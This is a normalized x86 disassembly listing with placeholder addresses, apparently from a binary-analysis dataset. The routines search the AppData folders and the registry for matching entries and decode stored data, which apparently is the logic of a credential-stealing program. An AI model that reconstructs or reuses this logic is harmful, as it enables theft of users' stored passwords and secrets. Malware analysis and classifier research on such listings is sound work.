push [ ebp + 0x8 ]
call sub_401133
or eax eax
jne r-xdata
push 0x10
push rw-data
lea eax [ ebp - 0x10 ]
push eax
call sub_40189c
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x14 ] 0x1
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_401390
or eax eax
je r-xdata
leave
retn 0x8
sub eax eax
leave
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push eax
sub ecx ecx
jmp r-xdata
or eax eax
jne r-xdata
shr eax 0x1
jae r-xdata
pop eax
cmp eax 0x1
jne r-xdata
inc ecx
cmp ecx 0x1
je r-xdata
mov eax 0x10000
mov [ rw-data ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_4013bd
cmp eax 0x1
je r-xdata
sub eax eax
leave
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_4013bd
cmp eax 0x1
je r-xdata
sub eax eax
leave
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_4013bd
or eax eax
jne r-xdata
sub eax eax
leave
retn 0x8
sub eax eax
leave
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_4013bd
cmp eax 0x40
jne r-xdata
sub eax eax
leave
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_4013bd
cmp eax 0x20
jne r-xdata
sub eax eax
leave
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_4013bd
cmp eax 0x20
jne r-xdata
sub eax eax
leave
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x20
push [ ebp + 0x8 ]
call sub_4013e8
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_401364
cmp eax 0x1
jb r-xdata
sub eax eax
leave
retn 0x8
cmp eax 0x3
ja r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov [ rw-data ] eax
lea eax [ ebp - 0x14 ]
push eax
push 0x28
push [ ebp + 0x8 ]
call sub_4013e8
push sub_40bbd0
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b4fb
leave
retn 0x8
sub_40becc
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x14
push [ ebp + 0x10 ]
push eax
call sub_401dc9
push eax
push r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_403f6b
call sub_401835
sub_40bf02
push ebp
mov ebp esp
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push 0x1a
push [ ebp + 0x8 ]
call sub_40becc
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push 0x1a
push [ ebp + 0x8 ]
call sub_40becc
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push 0x1c
push [ ebp + 0x8 ]
call sub_40becc
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push 0x1c
push [ ebp + 0x8 ]
call sub_40becc
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push 0x23
push [ ebp + 0x8 ]
call sub_40becc
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push 0x23
push [ ebp + 0x8 ]
call sub_40becc
leave
retn 0x8
sub_40bf93
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x32
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40bf02
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40bfc4
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x33
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40bf02
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40bff5
push ebp
mov ebp esp
add esp 0xfffffff8
push 0x0
push 0x34
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40bf02
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
mov [ ebp - 0x8 ] eax
push r-xdata
push 0xbeef0000
push rw-data
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_403f6b
push r-xdata
push 0xbeef0000
push rw-data
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_403f6b
push [ ebp - 0x8 ]
call sub_401835
sub_40c080
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x35
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40bf02
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40c0b1
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x36
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40bf02
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40c0e2
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x37
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40bf02
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40c113
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x38
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40bf02
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40c144
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0xc
push rw-data
push eax
call sub_401dc9
push eax
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_409886
call sub_401835
sub_40c174
push ebp
mov ebp esp
add esp 0xfffffff8
push edi
push 0x0
push 0x39
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push edi
call sub_4023a8
or eax eax
je r-xdata
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
push 0x1a
push [ ebp + 0x8 ]
call sub_40c144
push [ ebp - 0x8 ]
push 0x1c
push [ ebp + 0x8 ]
call sub_40c144
push [ ebp - 0x8 ]
push 0x23
push [ ebp + 0x8 ]
call sub_40c144
push rw-data
push [ ebp - 0x8 ]
call sub_401d75
or eax eax
je r-xdata
push [ ebp - 0x8 ]
call sub_401835
push eax
push [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_409886
call sub_401835
sub_40c221
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0xc
push rw-data
push eax
call sub_401dc9
push eax
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_409886
call sub_401835
sub_40c251
push ebp
mov ebp esp
add esp 0xfffffff8
push edi
push 0x0
push 0x3a
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push edi
call sub_4023a8
or eax eax
je r-xdata
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
push 0x1a
push [ ebp + 0x8 ]
call sub_40c221
push [ ebp - 0x8 ]
push 0x1c
push [ ebp + 0x8 ]
call sub_40c221
push [ ebp - 0x8 ]
push 0x23
push [ ebp + 0x8 ]
call sub_40c221
push [ ebp - 0x8 ]
call sub_401835
sub_40c2db
push ebp
mov ebp esp
add esp 0xfffffffc
push edi
push 0x0
push 0x3b
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push edi
call sub_4023a8
or eax eax
je r-xdata
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_40c34c
push ebp
mov ebp esp
add esp 0xffffffe8
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push [ ebp + 0xc ]
push 0x0
push 0x0
call MultiByteToWideChar
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
call sub_40184c
mov [ ebp - 0x4 ] eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push 0xffffffff
push [ ebp + 0xc ]
push 0x0
push 0x0
call MultiByteToWideChar
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
push 0x12
push 0x0
push [ ebp - 0x4 ]
call [ rw-data ]
test eax eax
js r-xdata
leave
retn 0xc
push [ ebp - 0x4 ]
call sub_401835
leave
retn 0xc
mov edx [ ebp - 0xc ]
mov edx [ edx ]
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x12
push 0x0
push rw-data
push [ ebp - 0xc ]
call [ edx + 0x10 ]
test eax eax
js r-xdata
mov edx [ ebp - 0xc ]
mov edx [ edx ]
push [ ebp - 0xc ]
call [ edx + 0x8 ]
push [ ebp - 0x10 ]
call sub_401082
mov [ ebp - 0x18 ] eax
or eax eax
je r-xdata
push [ ebp - 0x10 ]
call sub_401021
push [ ebp - 0x18 ]
call sub_40184c
mov [ ebp - 0x14 ] eax
push [ ebp - 0x10 ]
call sub_4012bb
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
call sub_401133
or eax eax
je r-xdata
push [ ebp - 0x14 ]
call sub_401835
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40151c
sub_40c444
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
push rw-data
push eax
call sub_401dc9
push eax
push sub_40c34c
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_403f6b
call sub_401835
leave
retn 0x8
push rw-data
push eax
call sub_401dc9
push eax
push sub_40c34c
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_403f6b
call sub_401835
sub_40c4b5
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x3c
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x1a
push [ ebp + 0x8 ]
call sub_40c444
push 0x23
push [ ebp + 0x8 ]
call sub_40c444
push 0x1c
push [ ebp + 0x8 ]
call sub_40c444
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40c4f7
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x8
push rw-data
push eax
call sub_401dc9
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_40c52e
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x3d
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x1a
push [ ebp + 0x8 ]
call sub_40c4f7
push 0x23
push [ ebp + 0x8 ]
call sub_40c4f7
push 0x1c
push [ ebp + 0x8 ]
call sub_40c4f7
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40c570
push ebp
mov ebp esp
add esp 0xfffffff8
push edi
push 0x0
push 0x3e
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push edi
call sub_4023a8
or eax eax
je r-xdata
mov [ ebp - 0x8 ] eax
push 0xbeef0000
push rw-data
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_404116
push [ ebp - 0x8 ]
call sub_401835
sub_40c5e8
push ebp
mov ebp esp
add esp 0xffffffe4
push edi
push 0x0
push 0x3f
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x14 ] eax
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
mov [ ebp - 0xc ] eax
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
push [ ebp - 0x14 ]
call sub_401835
push [ ebp - 0xc ]
call sub_401835
push [ ebp - 0x10 ]
call sub_401835
push [ ebp - 0x18 ]
call sub_401835
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
leave
retn 0x4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push edi
call sub_4023a8
or eax eax
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0xbeef0000
push rw-data
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_404116
push [ ebp - 0x8 ]
call sub_401835
push 0xbeef0001
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_40151c
sub_40c74f
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x40
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
push rw-data
push 0x80000000
call sub_401cee
or eax eax
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push eax
call sub_4023a8
or eax eax
je r-xdata
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_40c7ad
push ebp
mov ebp esp
add esp 0xfffffffc
push edi
push 0x0
push 0x41
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push edi
call sub_4023a8
or eax eax
je r-xdata
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_40c81e
push ebp
mov ebp esp
add esp 0xfffffffc
push edi
push 0x0
push 0x42
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push 0x23
call sub_401e2e
or eax eax
je r-xdata
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
push 0x23
call sub_401e2e
or eax eax
je r-xdata
push rw-data
push eax
call sub_401dc9
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push edi
call sub_4023a8
or eax eax
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
leave
retn 0x4
push rw-data
push eax
call sub_401dc9
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_40c8ed
push ebp
mov ebp esp
add esp 0xfffffff0
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_401f7a
or eax eax
je r-xdata
leave
retn 0xc
cmp [ ebp - 0x4 ] 0x2
jbe r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_40200e
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x222c
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40151c
sub_40c939
push ebp
mov ebp esp
add esp 0xfffffff8
push 0x0
push 0x43
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
mov [ ebp - 0x8 ] eax
push rw-data
push [ ebp - 0x8 ]
call StrStrIA
or eax eax
je r-xdata
push [ ebp - 0x8 ]
call sub_401835
push [ ebp - 0x8 ]
call sub_4023a8
push eax
push sub_40c8ed
push 0xbeef0000
push 0x0
push eax
push [ ebp + 0x8 ]
call sub_403f6b
call sub_401835
sub_40c9b3
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x44
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40c9ee
push ebp
mov ebp esp
add esp 0xfffffff8
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_40151c
push rw-data
push [ ebp + 0x10 ]
call StrStrIA
or eax eax
jne r-xdata
leave
retn 0x14
push rw-data
call lstrlenA
mov [ ebp - 0x8 ] eax
push rw-data
push [ ebp + 0x10 ]
call StrStrIA
or eax eax
je r-xdata
push [ ebp + 0x10 ]
call sub_403743
cmp eax 0xffffffff
je r-xdata
add eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push 0xbeef0001
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_40151c
sub_40ca9f
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
cmp [ rw-data ] 0x0
je r-xdata
pop esi
leave
retn 0x4
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push rw-data
call [ rw-data ]
or eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call [ rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push esi
mov esi [ esi ]
push [ esi + 0x18 ]
push [ esi + 0x1c ]
push [ esi + 0x8 ]
push [ esi + 0x30 ]
push [ ebp + 0x8 ]
call sub_40c9ee
pop esi
dec [ ebp - 0x8 ]
add esi 0x4
sub_40cb30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x0
push [ ebp + 0x10 ]
pop [ ebp - 0x4 ]
shr [ ebp - 0x4 ] 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push 0x0
push 0x0
call WideCharToMultiByte
or eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push eax
push eax
call sub_40184c
mov [ ebp - 0x8 ] eax
pop ecx
push 0x0
push 0x0
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push 0x0
push 0x0
call WideCharToMultiByte
or eax eax
jne r-xdata
push [ ebp - 0x8 ]
call sub_401835
mov eax [ ebp - 0xc ]
pop ebx
leave
retn 0xc
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call StrStrIA
or eax eax
je r-xdata
push [ ebp - 0x8 ]
call sub_401835
mov [ ebp - 0x8 ] 0x0
push eax
push [ ebp + 0x8 ]
call lstrlenA
pop ecx
add eax ecx
mov ebx eax
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
cmp [ eax ] 0xd
jne r-xdata
inc eax
mov [ eax ] 0x0
push ebx
call lstrlenA
or eax eax
je r-xdata
jmp r-xdata
push eax
push eax
call sub_40184c
mov [ ebp - 0xc ] eax
pop ecx
push ecx
push [ ebp - 0xc ]
push ebx
call sub_401883
sub_40cc02
push ebp
mov ebp esp
add esp 0xffffffd4
push esi
push edi
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_401f7a
or eax eax
je r-xdata
pop edi
pop esi
leave
retn 0xc
pop edi
pop esi
leave
retn 0xc
cmp [ ebp - 0x4 ] 0x100000
jae r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_40200e
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_402325
or eax eax
jne r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push rw-data
call sub_40cb30
mov [ ebp - 0x14 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push rw-data
call sub_40cb30
mov [ ebp - 0x18 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push rw-data
call sub_40cb30
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push [ ebp - 0x14 ]
call sub_401835
push [ ebp - 0x18 ]
call sub_401835
push [ ebp - 0x1c ]
call sub_401835
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push [ ebp - 0x18 ]
call lstrlenA
mov esi [ ebp - 0x18 ]
mov edi esi
mov ecx eax
shr ecx 0x1
push ecx
jmp r-xdata
or ecx ecx
jne r-xdata
lodsw [ esi ]
cmp al 0x30
jb r-xdata
pop ecx
mov [ ebp - 0x24 ] ecx
push [ ebp - 0x18 ]
pop [ ebp - 0x20 ]
mov [ ebp - 0x28 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x24 ]
push eax
call [ rw-data ]
or eax eax
je r-xdata
sub al 0x41
add al 0xa
cmp al 0x39
ja r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
sub ah 0x41
add ah 0xa
cmp ah 0x39
ja r-xdata
sub al 0x30
jmp r-xdata
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp - 0x1c ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40c9ee
push [ ebp - 0x28 ]
call LocalFree
sub ah 0x30
jmp r-xdata
cmp ah 0x30
jb r-xdata
shl al 0x4
or al ah
stosb [ edi ]
dec ecx
sub_40cd60
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x45
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call sub_40ca9f
push 0x5
call sub_401e2e
or eax eax
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push eax
push sub_40cc02
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_403f6b
call sub_401835
sub_40cdb5
push ebp
mov ebp esp
add esp 0xfffffffc
push edi
push 0x0
push 0x46
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push edi
call sub_4023a8
or eax eax
je r-xdata
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_40ce37
push ebp
mov ebp esp
add esp 0xfffff7d0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x810 ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x814 ] eax
call sub_401835
lea eax [ ebp - 0xc ]
push eax
push rw-data
push [ ebp - 0x814 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x828 ] eax
push 0x0
push rw-data
push [ ebp - 0x814 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x814 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x81c ] eax
lea eax [ ebp - 0x82c ]
push eax
push rw-data
push [ ebp - 0x814 ]
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
jmp r-xdata
or eax eax
je r-xdata
cmp [ ebp - 0x82c ] 0x4
jne r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0x820 ] 0x15
push eax
call sub_401835
push [ eax ]
pop [ ebp - 0x820 ]
push eax
call sub_401835
jmp r-xdata
push [ ebp - 0x828 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x824 ]
call sub_401835
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x830 ]
call sub_401835
push [ ebp - 0x814 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ce37
push [ ebp - 0x814 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
push rw-data
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x828 ]
call sub_4041a1
or eax eax
je r-xdata
push 0x0
push rw-data
push [ ebp - 0x814 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x824 ] eax
push 0x0
push rw-data
push [ ebp - 0x814 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x830 ] eax
cmp [ ebp - 0x828 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x810 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
